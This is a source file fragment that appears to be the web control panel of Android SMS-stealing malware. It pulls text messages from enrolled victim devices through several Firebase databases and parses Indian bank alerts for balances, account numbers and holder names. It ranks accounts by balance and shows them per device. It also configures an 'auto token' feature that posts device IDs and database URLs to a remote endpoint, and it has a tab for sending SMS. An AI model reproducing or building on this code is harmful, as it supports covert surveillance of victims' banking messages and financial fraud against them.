function extractBalanceFromSms(body){var b=String(body||''),patterns=[/(?:total\s*)?(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:avl|available)\s*bal[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/bal(?:ance)?\s*(?:is|as\s+on|now|as\s+of)\s*[:\-]?\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:closing|clear)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:balance\s+in\s+your\s+a\/c)[\s\S]{0,50}(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:credited|debited|withdrawn|deposited|transferred)[\s\S]{0,120}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:a\/c|acct)[^\d]{0,60}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/\bbal[:\s]+(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:is\s+)?(?:your\s+)?(?:avl|available|a\/c)\s*bal/i,/(?:credited|debited|deposited|transferred|withdrawn)\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/\b(?:bal|balance)\b[^0-9]*([\d,]+(?:\.\d{1,2})?)\s*(?:rs|inr|₹)/i],i,m,amt;for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1]){amt=parseInrAmount(m[1]);if(amt!=null)return amt;}}return null;}
function isBalanceAlertSms(body){var b=String(body||'');return /(?:avl|available)\s*bal|balance\s*(?:is|as\s+on|now|as\s+of)|closing\s*bal|clear\s*bal|balance\s+in\s+your\s+a\/c|\bbal[:\s]+(?:rs|inr|₹)/i.test(b);}
function looksLikeBankSms(body,address){var bal=extractBalanceFromSms(body);if(bal==null)return false;if(inferBankFromSender(address))return true;if(inferBankFromBody(body))return true;if(extractAccountFromSms(body))return true;if(isBalanceAlertSms(body))return true;if(/(?:credited|debited|withdrawn|deposited|transferred|spent|paid|received)/i.test(body)&&/(?:a\/c|acct|account)/i.test(body))return true;if(/(?:sbi|hdfc|icici|axis|kotak|pnb|bob|canara|union|idbi|yes\s*bank|indusind|federal|bandhan|idfc|rbl)/i.test(body))return true;return false;}
function maskBankAccount(acct){if(!acct||acct==='Unknown')return'Unknown';var d=String(acct).replace(/\D/g,'');if(d.length<=4)return d||'Unknown';return 'XXXX'+d.slice(-4);}
function formatInr(n){if(n==null||isNaN(n))return'—';return '₹ '+Number(n).toLocaleString('en-IN',{minimumFractionDigits:2,maximumFractionDigits:2});}
function parseBankAccountsFromSms(smsList){var map={},keys,k,row,bals,sum,i,acctKey;(smsList||[]).forEach(function(s){if(!s||!s.body||!looksLikeBankSms(s.body,s.address))return;var bal=extractBalanceFromSms(s.body);if(bal==null)return;var acct=extractAccountFromSms(s.body)||'';var bank=inferBankName(s.body,s.address);if(!bank)return;acctKey=acct||'NA';k=bank+'|'+acctKey;if(!map[k])map[k]={bank:bank,account:acct,holder:'',balances:[],latestMs:0,latestDate:'',sender:''};row=map[k];if(!row.account&&acct)row.account=acct;var holder=extractHolderFromSms(s.body);if(holder&&!row.holder)row.holder=holder;row.balances.push(bal);var ms=s.date||s.date_ms||0;if(ms>=row.latestMs){row.latestMs=ms;row.latestDate=s.date_readable||'';row.current=bal;row.sender=s.address||'';if(holder)row.holder=holder;if(acct)row.account=acct;}});keys=Object.keys(map);return keys.map(function(key){row=map[key];bals=row.balances;sum=0;for(i=0;i<bals.length;i++)sum+=bals[i];return{bank:row.bank,account:row.account,accountMask:maskBankAccount(row.account||'Unknown'),holder:row.holder||'',sender:row.sender||'',current:row.current!=null?row.current:bals[bals.length-1],average:sum/bals.length,highest:Math.max.apply(null,bals),lowest:Math.min.apply(null,bals),count:bals.length,latestDate:row.latestDate};}).sort(function(a,b){return a.bank.localeCompare(b.bank);});}
function renderBankAccounts(){
  var dev=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty');
  if(!dev){if(emptyEl){emptyEl.style.display='';emptyEl.innerHTML='<div class="ico">📱</div>Select a device to load bank balances<br><span style="font-size:12px;opacity:.6">Tap a device on Home</span>';}if(listEl)listEl.innerHTML='';return;}
  var smsList=window_allSms||[];
  if(!smsList.length&&emptyEl){emptyEl.style.display='';emptyEl.innerHTML='<div class="ico">📭</div>No SMS found<br><span style="font-size:12px;opacity:.6">Wait for SMS sync or switch to SMS tab</span>';listEl.innerHTML='';return;}
  var banks=parseBankAccountsFromSms(smsList);
  if(emptyEl)emptyEl.style.display=banks.length?'none':'';
  if(!banks.length){listEl.innerHTML='<div class="bank-empty"><div class="ico">🏦</div>No bank balance SMS found<br><span style="font-size:12px;opacity:.6">SBI, HDFC, ICICI alerts will appear here</span></div>';return;}
  listEl.innerHTML=banks.map(function(b){
    var sub=[b.holder?'👤 '+esc(b.holder):'',b.accountMask!=='Unknown'?'A/C '+esc(b.accountMask):''].filter(Boolean).join(' · ');
    return '<div class="bank-card-m"><div style="display:flex;gap:10px;align-items:center;margin-bottom:8px"><div style="font-size:28px">🏦</div><div><div class="bank-name-m">'+esc(b.bank)+'</div>'+
      (sub?'<div class="bank-acct-m">'+sub+'</div>':'')+
      (b.sender?'<div class="bank-acct-m" style="margin-top:2px">via '+esc(b.sender)+'</div>':'')+
      '</div></div>'+
      '<div class="bank-grid-m">'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">CURRENT BALANCE</div><div class="bank-stat-val-m current">'+formatInr(b.current)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">AVERAGE</div><div class="bank-stat-val-m">'+formatInr(b.average)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">HIGHEST</div><div class="bank-stat-val-m">'+formatInr(b.highest)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">LOWEST</div><div class="bank-stat-val-m">'+formatInr(b.lowest)+'</div></div>'+
      '</div><div class="bank-meta-m">'+b.count+' balance alert SMS'+(b.latestDate?' · Updated: '+esc(b.latestDate):'')+'</div></div>';
  }).join('');
}

function switchTab(name,btn){
  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
  document.getElementById('screen-'+name).classList.add('active');
  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
  if(btn)btn.classList.add('active');
  if(name==='sms'&&selDev)loadSmsForDevice();
  if(name==='device')renderDeviceView();
  if(name==='send')updateSendForm();
  if(name==='bank'&&selDev)renderBankAccounts();
}

/* APK headers + boot */
function rebelApkHeaders(){
  var h={};
  if(window.RebelAndroid){
    try{
      h['X-Rebel-Attest']=RebelAndroid.getAttest();
      h['X-Rebel-Device']=RebelAndroid.getDevice();
    }catch(e){}
  }
  return h;
}

/* AUTO TOKEN (via sex.php API) */
var _autoTokenOn=false;
function smsTokenFetch(body){
  var hdr={'Content-Type':'application/json'};
  var apk=rebelApkHeaders();
  for(var k in apk)hdr[k]=apk[k];
  return fetch(SMS_TOKEN_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
    .then(function(r){return r.json();});
}
function loadAutoTokenState(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok&&d.config){_autoTokenOn=!!d.config.enabled;document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);}
  }).catch(function(){});
}
function toggleAutoToken(){
  _autoTokenOn=!_autoTokenOn;
  document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
  smsTokenFetch({action:'save',enabled:_autoTokenOn}).then(function(){toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);});
}
function useSelForAutoToken(){
  var d=getSelDev();if(!d){toast('Select device on Home',false);return;}
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase missing',false);return;}
  smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
    toast('Auto SMS device set',true);
  }).catch(function(){toast('Auto token save failed',false);});
}

/* BOOT — direct open, all Firebase combined */
(function(){
  try{
    panelReady=true;
    fetchAllData().catch(function(){toast('Sync failed — check Firebase URL/secret',false);});
    loadAutoTokenState();
  }catch(e){console.error(e);}
})();
setInterval(function(){
  if(!panelReady)return;
  fetchAllData().catch(function(){});
},60000);
window.addEventListener('unhandledrejection',function(){});
<?php endif; ?>
</script>
</body>
</html>